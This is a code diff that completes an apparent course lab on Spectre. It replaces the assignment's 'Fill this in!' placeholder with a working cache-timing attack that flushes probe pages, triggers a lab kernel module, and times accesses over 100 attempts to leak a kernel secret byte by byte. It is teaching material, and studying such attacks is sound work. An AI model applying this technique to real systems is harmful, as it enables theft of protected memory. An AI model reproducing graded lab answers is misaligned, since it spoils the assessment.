@@ -11,6 +11,9 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define THRESHOLD 180
+#define ATTEMPTS 100
+
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -45,11 +48,33 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
-        // [Part 1]- Fill this in!
-        // Feel free to create helper methods as necessary.
-        // Use "call_kernel_part1" to interact with the kernel module
-        // Find the value of leaked_byte for offset "current_offset"
-        // leaked_byte = ??
+        int candidates[256] = {0};
+
+        for (int attempt = 0; attempt < ATTEMPTS; attempt++) {
+
+            for (int i = 0; i < 256; i++) {
+                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
+            }
+
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+            for (int i = 0; i < 256; i++) {
+                int mix_i = ((i * 167) + 13) & 255;
+                char *addr = &shared_memory[mix_i * SHD_SPECTRE_LAB_PAGE_SIZE];
+                uint64_t dt = time_access(addr);
+
+                if (dt < THRESHOLD) {
+                    candidates[mix_i]++;
+                }
+            }
+        }
+
+        int best = 0;
+        for (int i = 1; i < 256; i++) {
+            if (candidates[i] > candidates[best]) best = i;
+        }
+
+        leaked_byte = (char)best;
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
